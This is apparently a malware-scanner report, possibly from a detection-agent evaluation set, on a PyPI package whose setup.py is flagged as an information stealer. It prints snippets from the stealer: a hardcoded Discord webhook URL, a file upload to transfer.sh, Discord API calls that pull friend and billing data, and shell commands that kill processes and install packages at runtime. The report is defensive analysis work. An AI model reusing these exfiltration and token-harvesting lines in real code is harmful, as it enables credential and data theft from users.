{
  "package_name": "packagename69-1.0",
  "total_matches": 11,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 11,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a highly sophisticated information stealer (stealer malware). It performs the following malicious actions: (1) Steals Discord tokens, browser passwords, and cookies by searching browser and Discord application data folders, decrypting stored credentials, and extracting sensitive information. (2) Exfiltrates the stolen data to a hardcoded Discord webhook (https://discord.com/api/webhooks/1062909954459172955/_30y3ssoewpBLVDmcZVk6FlDMk7JWgbxIbghXxslxLmPtNTB-SWF0SLLD1O3THd18R5k) and to transfer.sh, a file hosting service. (3) Searches the victim's Desktop, Downloads, and Documents folders for files containing sensitive keywords (e.g., 'password', 'wallet', 'crypto', etc.) and uploads them. (4) Kills processes (e.g., browsers, wallets) to access locked files. (5) Installs dependencies at runtime using pip, which is a common malware evasion technique. (6) Uses threading to speed up data theft and evade detection. (7) Contains code to specifically target cryptocurrency wallets and other high-value targets. (8) Attempts to evade detection by checking for certain cookies. (9) The code is heavily obfuscated and uses misleading variable names. All these behaviors are typical of credential and information stealing malware.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "6",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "exec('')",
          "full_match": "* This package is executing OS commands in the setup.py file at packagename69-1.0/setup.py:6",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "39",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at packagename69-1.0/setup.py:39",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "526",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at packagename69-1.0/setup.py:526",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "23",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "hook='https://discord.com/api/webhooks/1062909954459172955/_30y3ssoewpBLVDmcZVk6FlDMk7JWgbxIbghXxslxLmPtNTB-SWF0SLLD1O3THd18R5k'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:23",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "28",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:28",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "131",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:131",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "153",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:153",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "208",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "request_guilds=urlopen(Request('https://discord.com/api/v9/users/@me/guilds?with_counts=true',headers=headers)).read().decode()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:208",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "216",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "request_billing_history=urlopen(Request('https://discord.com/api/v9/users/@me/billing/payments?limit=20',headers=headers)).read().decode()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:216",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "603",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "upload=requests.post('https://transfer.sh/',files=files)",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:603",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        },
        {
          "line_number": "685",
          "type_description": "shady-links: found 8 source code matches",
          "code_snippet": "'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[i...lix.com)'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at packagename69-1.0/setup.py:685",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/packagename69-1.0/packagename69-1.0/setup.py",
          "relative_path": "packagename69-1.0/setup.py"
        }
      ]
    }
  ]
}